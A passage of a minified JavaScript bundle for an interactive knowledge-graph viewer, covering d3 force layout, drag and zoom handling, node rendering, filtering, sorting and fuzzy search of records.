d<a&&(0===h&&(d+=(h=Zr())*h),0===f&&(d+=(f=Zr())*f),d<o&&(d=Math.sqrt(o*d)),e.vx+=h*t.value*n/d,e.vy+=f*t.value*n/d),!0;if(!(t.length||d>=a)){(t.data!==e||t.next)&&(0===h&&(d+=(h=Zr())*h),0===f&&(d+=(f=Zr())*f),d<o&&(d=Math.sqrt(o*d)));do{t.data!==e&&(l=r[t.data.index]*n/d,e.vx+=h*l,e.vy+=f*l)}while(t=t.next)}}return c.initialize=function(e){t=e,s()},c.strength=function(t){return arguments.length?(i="function"==typeof t?t:Vr(+t),s(),c):i},c.distanceMin=function(t){return arguments.length?(o=t*t,c):Math.sqrt(o)},c.distanceMax=function(t){return arguments.length?(a=t*t,c):Math.sqrt(a)},c.theta=function(t){return arguments.length?(u=t*t,c):Math.sqrt(u)},c}()).force("center",function(t,e){var n;function r(){var r,i,o=n.length,a=0,u=0;for(r=0;r<o;++r)a+=(i=n[r]).x,u+=i.y;for(a=a/o-t,u=u/o-e,r=0;r<o;++r)(i=n[r]).x-=a,i.y-=u}return null==t&&(t=0),null==e&&(e=0),r.initialize=function(t){n=t},r.x=function(e){return arguments.length?(t=+e,r):t},r.y=function(t){return arguments.length?(e=+t,r):e},r}()).force("forceX",function(t){var e,n,r,i=Vr(.1);function o(t){for(var i,o=0,a=e.length;o<a;++o)(i=e[o]).vx+=(r[o]-i.x)*n[o]*t}function a(){if(e){var o,a=e.length;for(n=new Array(a),r=new Array(a),o=0;o<a;++o)n[o]=isNaN(r[o]=+t(e[o],o,e))?0:+i(e[o],o,e)}}return"function"!=typeof t&&(t=Vr(null==t?0:+t)),o.initialize=function(t){e=t,a()},o.strength=function(t){return arguments.length?(i="function"==typeof t?t:Vr(+t),a(),o):i},o.x=function(e){return arguments.length?(t="function"==typeof e?e:Vr(+e),a(),o):t},o}()).force("forceY",function(t){var e,n,r,i=Vr(.1);function o(t){for(var i,o=0,a=e.length;o<a;++o)(i=e[o]).vy+=(r[o]-i.y)*n[o]*t}function a(){if(e){var o,a=e.length;for(n=new Array(a),r=new Array(a),o=0;o<a;++o)n[o]=isNaN(r[o]=+t(e[o],o,e))?0:+i(e[o],o,e)}}return"function"!=typeof t&&(t=Vr(null==t?0:+t)),o.initialize=function(t){e=t,a()},o.strength=function(t){return arguments.length?(i="function"==typeof t?t:Vr(+t),a(),o):i},o.y=function(e){return arguments.length?(t="function"==typeof e?e:Vr(+e),a(),o):t},o}());ss.force("center").x(.5*us).y(.5*cs),window.updateForces=function(){ss.force("charge").strength(-Math.abs(graphProperties.attraction_force)).distanceMax(graphProperties.attraction_distance_max),ss.force("forceX").strength(graphProperties.attraction_vertical),ss.force("forceY").strength(graphProperties.attraction_horizontal),ss.alpha(1).restart()},updateForces(),Jc("space",(function(t){t.preventDefault(),updateForces()})),ss.on("tick",(function(){hs.links.attr("x1",(function(t){return t.source.x})).attr("y1",(function(t){return t.source.y})).attr("x2",(function(t){return t.target.x})).attr("y2",(function(t){return t.target.y})),hs.nodes.attr("transform",(function(t){return"translate("+t.x+","+t.y+")"})),Lt("#load-bar-value").style("flex-basis",100*ss.alpha()+"%"),ms()}));var hs={},fs=new Set(["jpg","jpeg","png"]);function ls(t,e,n){for(var r=[],i=2*Math.PI/t,o=0;o<t;o++){var a=o*i,u=(o+1)*i,c=0+e*Math.cos(a),s=0+e*Math.sin(a),h=0+e*Math.cos(u),f=0+e*Math.sin(u),l="M ".concat(c," ").concat(s," A ").concat(e," ").concat(e," 0 0 1 ").concat(h," ").concat(f," L ").concat(0," ").concat(0," Z"),d=0+(e+n)*Math.cos(a),p=0+(e+n)*Math.sin(a),y=0+(e+n)*Math.cos(u),g=0+(e+n)*Math.sin(u),v="M ".concat(d," ").concat(p," A ").concat(e+n," ").concat(e+n," 0 0 1 ").concat(y," ").concat(g," L ").concat(0," ").concat(0," Z");r.push({segment:l,border:v})}return r}function ds(t){var e=hs.nodes.filter((function(t){return t.hidden===ns.notFiltered})).data().map((function(t){return t.id}));return{nodes:hs.nodes.filter((function(e){return t.includes(e.id)})),links:hs.links.filter((function(n){return!(!t.includes(n.source.id)&&!t.includes(n.target.id)||!e.includes(n.source.id)||!e.includes(n.target.id))}))}}function ps(t,e){var n=[],r=[];rs.forEach((function(e){t.includes(e)?r.push(e):n.push(e)})),function(t,e){if(hideNodeNetwork(t),function(t){var e,n=Es(t);try{for(n.s();!(e=n.n()).done;){var r=e.value;Cs.querySelectorAll('[data-index="'+r+'"]').forEach((function(t){t.style.display="none"}))}}catch(t){n.e(t)}finally{n.f()}}(t),void 0===e)throw new Error("Need priority");hs.nodes.data().map((function(n){var r=n.id,i=n.hidden;return t.includes(r)&&i<=e&&(n.hidden=e),n}))}(n,e),ys(r,e)}function ys(t){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:ns.notFiltered,n=[];hs.nodes.data().map((function(r){var i=r.id,o=r.hidden;return t.includes(i)&&o<=e&&(n.push(i),r.hidden=ns.notFiltered),r})),displayNodeNetwork(n),function(t){var e,n=Es(t=t.filter((function(t){if(_s.find((function(e){return e.id===t})).hidden===ns.notFiltered)return!0})));try{for(n.s();!(e=n.n()).done;){var r=e.value;Cs.querySelectorAll('[data-index="'+r+'"]').forEach((function(t){t.style.display=null}))}}catch(t){n.e(t)}finally{n.f()}}(n)}function gs(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:ns.notFiltered;ys(rs,t)}function vs(){if(0!==Tc.highlightedNodes.length){var t=ds(Tc.highlightedNodes),e=t.nodes,n=t.links;e.selectAll(".border").style("fill",null),n.style("stroke",null),Tc.highlightedNodes=[]}}function ms(){var t=c(data.nodes,(function(t){return t.x})),e=o(data.nodes,(function(t){return t.x})),n=c(data.nodes,(function(t){return t.y})),r=o(data.nodes,(function(t){return t.y})),i=window.innerWidth,a=window.innerHeight,u=Tc.position,s=u.x,h=u.y,f=u.zoom,l=c([a,i]),d=e-t;d<l&&(d=l);var p=r-n;if(p<l&&(p=l),0>t||0>n){var y=[(t-s)/f,(n-h)/f,d/f,p/f];os.attr("viewBox",y).attr("preserveAspectRatio",null)}else{var g=[(0-s)/f,(0-h)/f,d/f,p/f];os.attr("viewBox",g).attr("preserveAspectRatio","xMinYMin meet")}}hs.links=os.append("g").selectAll("line").data(data.links).enter().append("line").attr("stroke",(function(t){return t.color})).attr("title",(function(t){return t.title})).attr("data-source",(function(t){return t.source.id})).attr("data-target",(function(t){return t.target.id})).attr("stroke-dasharray",(function(t){return("dash"===t.shape.stroke||"dotted"===t.shape.stroke)&&t.shape.dashInterval})).attr("filter",(function(t){return"double"===t.shape.stroke&&"url(#double)"})),!0===graphProperties.graph_arrows&&hs.links.attr("marker-end","url(#arrow)"),hs.nodes=os.append("g").selectAll("g").data(data.nodes).enter().append("g").attr("data-node",(function(t){return t.id})).append("a").attr("href",(function(t){return"#"+t.id})).call(function(){var t,e,n,r,i=Ft,o=qt,a=Bt,u=Yt,c={},s=p("start","drag","end"),h=0,f=0;function l(t){t.on("mousedown.drag",d).filter(u).on("touchstart.drag",v).on("touchmove.drag",m).on("touchend.drag touchcancel.drag",_).style("touch-action","none").style("-webkit-tap-highlight-color","rgba(0,0,0,0)")}function d(){if(!r&&i.apply(this,arguments)){var a=b("mouse",o.apply(this,arguments),Ut,this,arguments);a&&(Lt(yt.view).on("mousemove.drag",y,!0).on("mouseup.drag",g,!0),zt(yt.view),Ot(),n=!1,t=yt.clientX,e=yt.clientY,a("start"))}}function y(){if(jt(),!n){var r=yt.clientX-t,i=yt.clientY-e;n=r*r+i*i>f}c.mouse("drag")}function g(){Lt(yt.view).on("mousemove.drag mouseup.drag",null),Pt(yt.view,n),jt(),c.mouse("end")}function v(){if(i.apply(this,arguments)){var t,e,n=yt.changedTouches,r=o.apply(this,arguments),a=n.length;for(t=0;t<a;++t)(e=b(n[t].identifier,r,Dt,this,arguments))&&(Ot(),e("start"))}}function m(){var t,e,n=yt.changedTouches,r=n.length;for(t=0;t<r;++t)(e=c[n[t].identifier])&&(jt(),e("drag"))}function _(){var t,e,n=yt.changedTouches,i=n.length;for(r&&clearTimeout(r),r=setTimeout((function(){r=null}),500),t=0;t<i;++t)(e=c[n[t].identifier])&&(Ot(),e("end"))}function b(t,e,n,r,i){var o,u,f,d=n(e,t),p=s.copy();if(bt(new Rt(l,"beforestart",o,t,h,d[0],d[1],0,0,p),(function(){return null!=(yt.subject=o=a.apply(r,i))&&(u=o.x-d[0]||0,f=o.y-d[1]||0,!0)})))return function a(s){var y,g=d;switch(s){case"start":c[t]=a,y=h++;break;case"end":delete c[t],--h;case"drag":d=n(e,t),y=h}bt(new Rt(l,s,o,t,y,d[0]+u,d[1]+f,d[0]-g[0],d[1]-g[1],p),p.apply,p,[s,r,i])}}return l.filter=function(t){return arguments.length?(i="function"==typeof t?t:It(!!t),l):i},l.container=function(t){return arguments.length?(o="function"==typeof t?t:It(t),l):o},l.subject=function(t){return arguments.length?(a="function"==typeof t?t:It(t),l):a},l.touchable=function(t){return arguments.length?(u="function"==typeof t?t:It(!!t),l):u},l.on=function(){var t=s.on.apply(s,arguments);return t===s?l:t},l.clickDistance=function(t){return arguments.length?(f=(t=+t)*t,l):Math.sqrt(f)},l}().on("start",(function(t){yt.active||ss.alphaTarget(.3).restart(),t.fx=t.x,t.fy=t.y})).on("drag",(function(t){t.fx=yt.x,t.fy=yt.y})).on("end",(function(t){yt.active||ss.alphaTarget(1e-4),t.fx=null,t.fy=null}))).on("mouseover",(function(t){var e=[t.id],n=hs.links.filter((function(n){return n.source.id!==t.id&&n.target.id!==t.id||(e.push(n.source.id,n.target.id),!1)})),r=hs.nodes.filter((function(t){return!e.includes(t.id)})),i=hs.links.filter((function(e){return e.source.id===t.id||e.target.id===t.id}));hs.nodes.filter((function(t){return!!e.includes(t.id)})).selectAll(".border").style("fill","var(--highlight)"),i.style("stroke","var(--highlight)"),r.attr("opacity",.5),n.attr("stroke-opacity",.5)})).on("mouseout",(function(){var t=Ns();hs.nodes.filter((function(e){var n=e.id;return!t||n!==t})).selectAll(".border").style("fill",null),hs.links.filter((function(e){return!t||e.source.id!==t&&e.target.id!==t})).style("stroke",null),hs.nodes.attr("opacity",null),hs.links.attr("stroke-opacity",null)})),hs.nodes.each((function(t){var e=Lt(this),n=function(t){return fs.has(t.split(".").at(-1))?"url(#".concat(t,")"):t},r=function(n,r){e.append("circle").attr("class","border").attr("r",t.size+2).attr("fill",n),e.append("circle").attr("r",t.size).attr("fill",r)};if(t.thumbnail)1===t.types.length?r(graphProperties.record_types[t.types[0]].stroke,"url(#".concat(t.thumbnail,")")):(ls(t.types.length,t.size,2).forEach((function(n,r){var i=n.border,o=graphProperties.record_types[t.types[r]];e.append("path").attr("d",i).attr("fill",o.stroke).attr("class","border")})),e.append("circle").attr("r",t.size).attr("fill","var(--background-gray)"),e.append("circle").attr("r",t.size).attr("fill","url(#".concat(t.thumbnail,")")));else if(1===t.types.length){var i=graphProperties.record_types[t.types[0]];r(i.stroke,n(i.fill))}else ls(t.types.length,t.size,2).forEach((function(r,i){var o=r.segment,a=r.border,u=graphProperties.record_types[t.types[i]];e.append("path").attr("d",a).attr("fill",u.stroke).attr("class","border"),e.append("path").attr("d",o).attr("fill","var(--background-gray)"),e.append("path").attr("d",o).attr("fill",n(u.fill))}))})),hs.labels=hs.nodes.append("text").each((function(t){for(var e=t.label.split(" "),n=Lt(this),r="",i=0;i<e.length;i++)(r+=e[i]+" ").length<25&&i!==e.length-1||(n.append("tspan").attr("x",0).attr("dy","1.2em").text(r.slice(0,-1)),r="")})).attr("font-size",graphProperties.graph_text_size).attr("x",0).attr("y",(function(t){return t.size})).attr("dominant-baseline","middle").attr("text-anchor","middle"),window.hideNodeNetwork=function(t){var e=ds(t),n=e.nodes,r=e.links;n.style("display","none"),r.style("display","none")},window.displayNodeNetwork=function(t){var e=ds(t),n=e.nodes,r=e.links;n.style("display",null),r.style("display",null)},window.linksDisplayToggle=function(t){t?hs.links.style("display",null):hs.links.style("display","none")},window.labelDisplayToggle=function(t){t?hs.labels.style("display",null):hs.labels.style("display","none")},window.labelHighlight=function(t){hs.nodes.data().map((function(e){return t.includes(e.id)&&(e.highlighted=!0),e})),hs.nodes.filter((function(e){return t.includes(e.id)})).select("text").style("fill","var(--highlight)")},window.updateFontsize=function(){hs.labels.attr("font-size",graphProperties.text_size)},window.labelUnlight=function(t){hs.nodes.data().map((function(e){return t.includes(e.id)&&(e.highlighted=!1),e})),hs.nodes.filter((function(e){return t.includes(e.id)})).select("text").style("fill",null)},window.labelUnlightAll=function(){data.nodes=data.nodes.map((function(t){return t.highlighted=!1,t})),hs.labels.style("fill",null)};var _s=hs.nodes.data(),bs=(hs.links.data(),.2),ws=_s.reduce((function(t,e){return t+e.size}),0);window.addEventListener("resize",(function(){var t=ws/(window.innerWidth*window.innerHeight);t*=1e3,bs=Math.log2(t)}));var xs=function(){var t,e,n=bc,r=wc,i=Ec,o=kc,a=Mc,u=[0,1/0],c=[[-1/0,-1/0],[1/0,1/0]],s=250,h=yn,f=[],l=p("start","zoom","end"),d=500,y=150,g=0;function v(t){t.property("__zoom",xc).on("wheel.zoom",M).on("mousedown.zoom",E).on("dblclick.zoom",A).filter(a).on("touchstart.zoom",S).on("touchmove.zoom",L).on("touchend.zoom touchcancel.zoom",N).style("touch-action","none").style("-webkit-tap-highlight-color","rgba(0,0,0,0)")}function m(t,e){return(e=Math.max(u[0],Math.min(u[1],e)))===t.k?t:new gc(e,t.x,t.y)}function _(t,e,n){var r=e[0]-n[0]*t.k,i=e[1]-n[1]*t.k;return r===t.x&&i===t.y?t:new gc(t.k,r,i)}function b(t){return[(+t[0][0]+ +t[1][0])/2,(+t[0][1]+ +t[1][1])/2]}function w(t,e,n){t.on("start.zoom",(function(){x(this,arguments).start()})).on("interrupt.zoom end.zoom",(function(){x(this,arguments).end()})).tween("zoom",(function(){var t=this,i=arguments,o=x(t,i),a=r.apply(t,i),u=n||b(a),c=Math.max(a[1][0]-a[0][0],a[1][1]-a[0][1]),s=t.__zoom,f="function"==typeof e?e.apply(t,i):e,l=h(s.invert(u).concat(c/s.k),f.invert(u).concat(c/f.k));return function(t){if(1===t)t=f;else{var e=l(t),n=c/e[2];t=new gc(n,u[0]-e[0]*n,u[1]-e[1]*n)}o.zoom(null,t)}}))}function x(t,e){for(var n,r=0,i=f.length;r<i;++r)if((n=f[r]).that===t)return n;return new k(t,e)}function k(t,e){this.that=t,this.args=e,this.index=-1,this.active=0,this.extent=r.apply(t,e)}function M(){if(n.apply(this,arguments)){var t=x(this,arguments),e=this.__zoom,r=Math.max(u[0],Math.min(u[1],e.k*Math.pow(2,o.apply(this,arguments)))),a=Ut(this);if(t.wheel)t.mouse[0][0]===a[0]&&t.mouse[0][1]===a[1]||(t.mouse[1]=e.invert(t.mouse[0]=a)),clearTimeout(t.wheel);else{if(e.k===r)return;t.mouse=[a,e.invert(a)],Hn(this),t.start()}_c(),t.wheel=setTimeout((function(){t.wheel=null,t.end()}),y),t.zoom("mouse",i(_(m(e,r),t.mouse[0],t.mouse[1]),t.extent,c))}}function E(){if(!e&&n.apply(this,arguments)){var t=x(this,arguments),r=Lt(yt.view).on("mousemove.zoom",(function(){if(_c(),!t.moved){var e=yt.clientX-a,n=yt.clientY-u;t.moved=e*e+n*n>g}t.zoom("mouse",i(_(t.that.__zoom,t.mouse[0]=Ut(t.that),t.mouse[1]),t.extent,c))}),!0).on("mouseup.zoom",(function(){r.on("mousemove.zoom mouseup.zoom",null),Pt(yt.view,t.moved),_c(),t.end()}),!0),o=Ut(this),a=yt.clientX,u=yt.clientY;zt(yt.view),mc(),t.mouse=[o,this.__zoom.invert(o)],Hn(this),t.start()}}function A(){if(n.apply(this,arguments)){var t=this.__zoom,e=Ut(this),o=t.invert(e),a=t.k*(yt.shiftKey?.5:2),u=i(_(m(t,a),e,o),r.apply(this,arguments),c);_c(),s>0?Lt(this).transition().duration(s).call(w,u,e):Lt(this).call(v.transform,u)}}function S(){if(n.apply(this,arguments)){var e,r,i,o,a=x(this,arguments),u=yt.changedTouches,c=u.length;for(mc(),r=0;r<c;++r)o=[o=Dt(this,u,(i=u[r]).identifier),this.__zoom.invert(o),i.identifier],a.touch0?a.touch1||(a.touch1=o):(a.touch0=o,e=!0);if(t&&(t=clearTimeout(t),!a.touch1))return a.end(),void((o=Lt(this).on("dblclick.zoom"))&&o.apply(this,arguments));e&&(t=setTimeout((function(){t=null}),d),Hn(this),a.start())}}function L(){var e,n,r,o,a=x(this,arguments),u=yt.changedTouches,s=u.length;for(_c(),t&&(t=clearTimeout(t)),e=0;e<s;++e)r=Dt(this,u,(n=u[e]).identifier),a.touch0&&a.touch0[2]===n.identifier?a.touch0[0]=r:a.touch1&&a.touch1[2]===n.identifier&&(a.touch1[0]=r);if(n=a.that.__zoom,a.touch1){var h=a.touch0[0],f=a.touch0[1],l=a.touch1[0],d=a.touch1[1],p=(p=l[0]-h[0])*p+(p=l[1]-h[1])*p,y=(y=d[0]-f[0])*y+(y=d[1]-f[1])*y;n=m(n,Math.sqrt(p/y)),r=[(h[0]+l[0])/2,(h[1]+l[1])/2],o=[(f[0]+d[0])/2,(f[1]+d[1])/2]}else{if(!a.touch0)return;r=a.touch0[0],o=a.touch0[1]}a.zoom("touch",i(_(n,r,o),a.extent,c))}function N(){var t,n,r=x(this,arguments),i=yt.changedTouches,o=i.length;for(mc(),e&&clearTimeout(e),e=setTimeout((function(){e=null}),d),t=0;t<o;++t)n=i[t],r.touch0&&r.touch0[2]===n.identifier?delete r.touch0:r.touch1&&r.touch1[2]===n.identifier&&delete r.touch1;r.touch1&&!r.touch0&&(r.touch0=r.touch1,delete r.touch1),r.touch0?r.touch0[1]=this.__zoom.invert(r.touch0[0]):r.end()}return v.transform=function(t,e){var n=t.selection?t.selection():t;n.property("__zoom",xc),t!==n?w(t,e):n.interrupt().each((function(){x(this,arguments).start().zoom(null,"function"==typeof e?e.apply(this,arguments):e).end()}))},v.scaleBy=function(t,e){v.scaleTo(t,(function(){return this.__zoom.k*("function"==typeof e?e.apply(this,arguments):e)}))},v.scaleTo=function(t,e){v.transform(t,(function(){var t=r.apply(this,arguments),n=this.__zoom,o=b(t),a=n.invert(o),u="function"==typeof e?e.apply(this,arguments):e;return i(_(m(n,u),o,a),t,c)}))},v.translateBy=function(t,e,n){v.transform(t,(function(){return i(this.__zoom.translate("function"==typeof e?e.apply(this,arguments):e,"function"==typeof n?n.apply(this,arguments):n),r.apply(this,arguments),c)}))},v.translateTo=function(t,e,n){v.transform(t,(function(){var t=r.apply(this,arguments),o=this.__zoom,a=b(t);return i(vc.translate(a[0],a[1]).scale(o.k).translate("function"==typeof e?-e.apply(this,arguments):-e,"function"==typeof n?-n.apply(this,arguments):-n),t,c)}))},k.prototype={start:function(){return 1==++this.active&&(this.index=f.push(this)-1,this.emit("start")),this},zoom:function(t,e){return this.mouse&&"mouse"!==t&&(this.mouse[1]=e.invert(this.mouse[0])),this.touch0&&"touch"!==t&&(this.touch0[1]=e.invert(this.touch0[0])),this.touch1&&"touch"!==t&&(this.touch1[1]=e.invert(this.touch1[0])),this.that.__zoom=e,this.emit("zoom"),this},end:function(){return 0==--this.active&&(f.splice(this.index,1),this.index=-1,this.emit("end")),this},emit:function(t){bt(new yc(v,t,this.that.__zoom),l.apply,l,[t,this.that,this.args])}},v.wheelDelta=function(t){return arguments.length?(o="function"==typeof t?t:pc(+t),v):o},v.filter=function(t){return arguments.length?(n="function"==typeof t?t:pc(!!t),v):n},v.touchable=function(t){return arguments.length?(a="function"==typeof t?t:pc(!!t),v):a},v.extent=function(t){return arguments.length?(r="function"==typeof t?t:pc([[+t[0][0],+t[0][1]],[+t[1][0],+t[1][1]]]),v):r},v.scaleExtent=function(t){return arguments.length?(u[0]=+t[0],u[1]=+t[1],v):[u[0],u[1]]},v.translateExtent=function(t){return arguments.length?(c[0][0]=+t[0][0],c[1][0]=+t[1][0],c[0][1]=+t[0][1],c[1][1]=+t[1][1],v):[[c[0][0],c[0][1]],[c[1][0],c[1][1]]]},v.constrain=function(t){return arguments.length?(i=t,v):i},v.duration=function(t){return arguments.length?(s=+t,v):s},v.interpolate=function(t){return arguments.length?(h=t,v):h},v.on=function(){var t=l.on.apply(l,arguments);return t===l?v:t},v.clickDistance=function(t){return arguments.length?(g=(t=+t)*t,v):Math.sqrt(g)},v}().scaleExtent([1,10]).on("zoom",(function(){var t=yt.transform,e=t.x,n=t.y,r=t.k;Tc.position.x=e||0,Tc.position.y=n||0,Tc.position.zoom=r||1,ms()}));function ks(){Tc.position.zoom=1,Tc.position.x=0,Tc.position.y=0,is.call(xs.transform,vc.translate(Tc.position.y,Tc.position.x).scale(Tc.position.zoom)),ms()}function Ms(t){var e=_s.find((function(e){return e.id===t}));if(e){var n=e.x,r=e.y,i=u(_s,(function(t){return t.x})),o=u(_s,(function(t){return t.y})),a=1===Tc.position.zoom?Tc.position.zoom+2*bs:Tc.position.zoom;is.call(xs.transform,vc.translate(-(n*a-i),-(r*a-o)).scale(a)),ms()}}function Es(t,e){var n="undefined"!=typeof Symbol&&t[Symbol.iterator]||t["@@iterator"];if(!n){if(Array.isArray(t)||(n=As(t))||e&&t&&"number"==typeof t.length){n&&(t=n);var r=0,i=function(){};return{s:i,n:function(){return r>=t.length?{done:!0}:{done:!1,value:t[r++]}},e:function(t){throw t},f:i}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var o,a=!0,u=!1;return{s:function(){n=n.call(t)},n:function(){var t=n.next();return a=t.done,t},e:function(t){u=!0,o=t},f:function(){try{a||null==n.return||n.return()}finally{if(u)throw o}}}}function As(t,e){if(t){if("string"==typeof t)return Ss(t,e);var n=Object.prototype.toString.call(t).slice(8,-1);return"Object"===n&&t.constructor&&(n=t.constructor.name),"Map"===n||"Set"===n?Array.from(t):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?Ss(t,e):void 0}}function Ss(t,e){(null==e||e>t.length)&&(e=t.length);for(var n=0,r=new Array(e);n<e;n++)r[n]=t[n];return r}function Ls(){var t=document.querySelector(".record.active");t&&t.classList.remove("active")}function Ns(){var t=new URL(window.location).hash;if(t)return decodeURI(t.substring(1))}is.call(xs),Jc("e,alt+r",(function(t){t.preventDefault(),ks()})),Jc("c",(function(t){t.preventDefault(),Ms(Ns())})),window.zoomMore=function(){xs.scaleTo(is,Tc.position.zoom+bs)},window.zoomLess=function(){xs.scaleTo(is,Tc.position.zoom-bs)},window.zoomReset=ks,window.addEventListener("DOMContentLoaded",(function(){var t=document.getElementById("record-container"),e=document.getElementById("close-right-side"),n=Ns();n&&i(n);var r=!1;function i(n){var i,o,a,u,c=document.getElementById(n);if(c){Ls(),r||(e.classList.add("active"),t.classList.add("active")),t.scrollTo({top:0}),Ls(),c.classList.add("active"),vs(),o=ds(i=[n]),a=o.nodes,u=o.links,a.selectAll(".border").style("fill","var(--highlight)"),u.style("stroke","var(--highlight)"),Tc.highlightedNodes=Tc.highlightedNodes.concat(i);var s=c.querySelector("h1").textContent;document.title=s}}e.addEventListener("click",(function(){e.classList.toggle("active"),t.classList.toggle("active"),r=!r})),Jc("escape",(function(){e.classList.remove("active"),t.classList.remove("active"),history.pushState("",document.title,window.location.pathname),vs()})),window.addEventListener("hashchange",(function(){var e=Ns();e?(i(e),Ms(e)):(t.classList.remove("active"),vs())}))}));var Cs=document.getElementById("index");window.addEventListener("DOMContentLoaded",(function(){var t=Cs.querySelector(".sorting-select"),e=sorting.records;function n(){for(var n=Cs.querySelectorAll("li"),r=function(t,e){return function(t){if(Array.isArray(t))return t}(t)||function(t,e){var n=null==t?null:"undefined"!=typeof Symbol&&t[Symbol.iterator]||t["@@iterator"];if(null!=n){var r,i,o,a,u=[],c=!0,s=!1;try{if(o=(n=n.call(t)).next,0===e){if(Object(n)!==n)return;c=!1}else for(;!(c=(r=o.call(n)).done)&&(u.push(r.value),u.length!==e);c=!0);}catch(t){s=!0,i=t}finally{try{if(!c&&null!=n.return&&(a=n.return(),Object(a)!==a))return}finally{if(s)throw i}}return u}}(t,e)||As(t,e)||function(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}(t.value.split(":"),2),i=r[0],o=r[1],a=0;a<n.length;a++){var u=e[a][i],c=n[a];"reverse"===o&&(u=n.length-1-u),c.style.order=u}}n(),t.addEventListener("change",n)}));var Ts=n(691),Gs=new(n.n(Ts)())([],{includeScore:!1,keys:["label"]});function Us(t,e){var n="undefined"!=typeof Symbol&&t[Symbol.iterator]||t["@@iterator"];if(!n){if(Array.isArray(t)||(n=Ds(t))||e&&t&&"number"==typeof t.length){n&&(t=n);var r=0,i=function(){};return{s:i,n:function(){return r>=t.length?{done:!0}:{done:!1,value:t[r++]}},e:function(t){throw t},f:i}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var o,a=!0,u=!1;return{s:function(){n=n.call(t)},n:function(){var t=n.next();return a=t.done,t},e:function(t){u=!0,o=t},f:function(){try{a||null==n.return||n.return()}finally{if(u)throw o}}}}function Ds(t,e){if(t){if("string"==typeof t)return Os(t,e);var n=Object.prototype.toString.call(t).slice(8,-1);return"Object"===n&&t.constructor&&(n=t.constructor.name),"Map"===n||"Set"===n?Array.from(t):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?Os(t,e):void 0}}function Os(t,e){(null==e||e>t.length)&&(e=t.length);for(var n=0,r=new Array(e);n<e;n++)r[n]=t[n];return r}function js(){var t,e=document.getElementById("index-counter"),n=document.querySelectorAll(".menu-types-list .badge"),r=0,i={},o=Us(data.nodes);try{for(o.s();!(t=o.n()).done;){var a=t.value,u=a.hidden,c=a.type;!0!==u&&(r+=1,i[c]?i[c]+=1:i[c]=1)}}catch(t){o.e(t)}finally{o.f()}var s,h=Us(n);try{for(h.s();!(s=h.n()).done;){var f=s.value;zs(f,i[f.previousElementSibling.name]||0)}}catch(t){h.e(t)}finally{h.f()}zs(e,r)}function zs(t,e){var n,r,i=(n=t.textContent.split("/",2),r=2,function(t){if(Array.isArray(t))return t}(n)||function(t,e){var n=null==t?null:"undefined"!=typeof Symbol&&t[Symbol.iterator]||t["@@iterator"];if(null!=n){var r,i,o,a,u=[],c=!0,s=!1;try{if(o=(n=n.call(t)).next,0===e){if(Object(n)!==n)return;c=!1}else for(;!(c=(r=o.call(n)).done)&&(u.push(r.value),u.length!==e);c=!0);}catch(t){s=!0,i=t}finally{try{if(!c&&null!=n.return&&(a=n.return(),Object(a)!==a))return}finally{if(s)throw i}}return u}}(n,r)||Ds(n,r)||function(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()),o=i[0],a=i[1];o=Number(o),a=Number(a)||o,t.textContent=e===a?a:"".concat(e,"/").concat(a)}function Ps(t,e){(null==e||e>t.length)&&(e=t.length);for(var n=0,r=new Array(e);n<e;n++)r[n]=t[n];return r}window.addEventListener("DOMContentLoaded",(function(){var t=[],e=0,n=document.getElementById("search"),r=document.getElementById("search-result-list");function i(){r.childNodes[e].classList.add("outline")}function o(){r.childNodes[e].classList.remove("outline")}n.addEventListener("focus",(function(){Gs.setCollection(_s.filter((function(t){return 0===t.hidden}))),n.addEventListener("input",(function(){if(r.innerHTML="",e=0,t=[],""!==n.value){t=Gs.search(n.value);for(var o=0;o<Math.min(5,t.length);o++){var a=t[o].item,u=a.id,c=a.label,s=a.types,h=document.createElement("li");h.classList.add("search-result-item"),h.innerHTML='\n        <a href="#'.concat(u,'">\n          <span class="record-type-points">\n              ').concat(s.map((function(t){return'<span style="color:var(--n_'.concat(t,')">⬤</span>')})).join(" "),'\n          </span>\n          <span class="record-title">').concat(c,"</span>\n        </a>"),r.appendChild(h)}i()}}))})),Jc("s",(function(t){t.preventDefault(),n.focus()})),document.addEventListener("keydown",(function(r){if(0!==t.length)switch(r.key){case"ArrowUp":r.preventDefault(),e>0&&(o(),e--,i()),0===e&&n.focus();break;case"ArrowDown":if(r.preventDefault(),4===e||e===t.length-1)break;o(),e++,i(),1===e&&n.blur();break;case"Enter":r.preventDefault(),window.location.hash=t[e].item.id,n.blur()}}))})),n(838);var Is=timeline,Rs=Is.begin,Fs=Is.end;function qs(t){return new Date(1e3*t).toLocaleDateString(graphProperties.lang)}function Bs(t,e){return function(t){if(Array.isArray(t))return t}(t)||function(t,e){var n=null==t?null:"undefined"!=typeof Symbol&&t[Symbol.iterator]||t["@@iterator"];if(null!=n){var r,i,o,a,u=[],c=!0,s=!1;try{if(o=(n=n.call(t)).next,0===e){if(Object(n)!==n)return;c=!1}else for(;!(c=(r=o.call(n)).done)&&(u.push(r.value),u.length!==e);c=!0);}catch(t){s=!0,i=t}finally{try{if(!c&&null!=n.return&&(a=n.return(),Object(a)!==a))return}finally{if(s)throw i}}return u}}(t,e)||Ys(t,e)||function(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function Ys(t,e){if(t){if("string"==typeof t)return Ws(t,e);var n=Object.prototype.toString.call(t).slice(8,-1);return"Object"===n&&t.constructor&&(n=t.constructor.name),"Map"===n||"Set"===n?Array.from(t):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?Ws(t,e):void 0}}function Ws(t,e){(null==e||e>t.length)&&(e=t.length);for(var n=0,r=new Array(e);n<e;n++)r[n]=t[n];return r}function Ks(t,e){if(t){if("string"==typeof 